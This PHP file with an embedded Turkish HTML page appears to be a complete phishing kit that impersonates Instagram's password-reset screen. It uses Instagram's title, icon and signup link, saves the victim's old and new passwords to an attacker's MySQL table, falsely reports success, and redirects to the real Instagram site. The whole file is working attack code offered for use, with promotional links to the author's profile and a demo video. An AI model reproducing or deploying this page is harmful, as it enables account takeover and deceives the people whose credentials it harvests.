<?php

// -- ███████╗██████╗ ██╗   ██╗     ██╗███╗   ██╗███████╗████████╗ █████╗ -- \\
// -- ██╔════╝██╔══██╗╚██╗ ██╔╝     ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗ -- \\
// -- ███████╗██████╔╝ ╚████╔╝█████╗██║██╔██╗ ██║███████╗   ██║   ███████║ -- \\
// -- ╚════██║██╔═══╝   ╚██╔╝ ╚════╝██║██║╚██╗██║╚════██║   ██║   ██╔══██║ -- \\  
// -- ███████║██║        ██║        ██║██║ ╚████║███████║   ██║   ██║  ██║ -- \\
// -- ╚══════╝╚═╝        ╚═╝        ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ -- \\
// --                            Developer By: BlackPion                   -- \\
// --                            Github: https://l24.im/RpHLQx             -- \\
// --                            Forum Profil Linki: https://l24.im/dNx8   -- \\
// --                            Tanıtım Videosu Linki: https://l24.im/vQFjh -- \\
include("DBconn.php");

if (isset($_POST["button"])) {
    if (empty($_POST["password"]) || empty($_POST["new_password"])) {
        echo "<script>alert
        
        ('Hata! Gerekli Alanları Eksiksiz Doldurun!');
        
        </script>";
    } else 
    {

        $pass = $_POST["password"];
        $reset_pass = $_POST["new_password"];

        
        $sql = "INSERT INTO insta_reset_password (insta_old_password, insta_new_password) VALUES (?, ?)";
        $stmt = mysqli_prepare($sql_conn, $sql);

        if ($stmt) {
            mysqli_stmt_bind_param($stmt, "ss", $pass, $reset_pass);
            mysqli_stmt_execute($stmt);
            mysqli_stmt_close($stmt);

            echo "<script>alert('Şifreniz Başarıyla Değiştirildi');</script>";
            header("Refresh: 0.7; URL=https://www.instagram.com/");
            exit();
        }

        mysqli_close($sql_conn);
    }
}
?>





<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/styles.css" />
    <title>Şifreyi Yenile • Instagram</title>
    <link rel="icon" href="ico/instagram-icon.ico" type="ico/instagram-icon.ico" />

</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="resimler/Black-Lock-Logo.jpeg" alt="Kilit Logo" title="Kilit logo" />
                </h1>
                <p class="login-help-text">Güçlü Bir Şifre Oluştur</p>
                <p class="additional-info">
                    Şifren en az 6 karakter uzunluğunda olmalı ve rakamlar, harfler.
                    ve özel karakterlerden (!$@%) <br> oluşmalıdır.
                </p>
                <form action="index.php" method="POST">
                    <label for="password" class="sr-only">Şifre</label>
                    <input name="password" title="Gerekli Alanı Doldurun!" id="input1" type="password" placeholder="Önceki şifre" class="border border-danger form-control-sm"/>

                    <label for="password" class="sr-only">Şifre</label>
                    <input name="new_password" title="Gerekli Alanı Doldurun!" id="input2" type="password" placeholder="Yeni şifre" class="border border-danger form-control-sm"/>

                    <button name="button" title="Şifreyi Yenile" id="submitbtn" type="submit">Şifreyi yenile</button>
                </form>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                    </div>

                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Hesabın yok mu?</p>
                <a title="Kaydol" href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
            </div>
        </section>
    </main>  
</body>
</html>
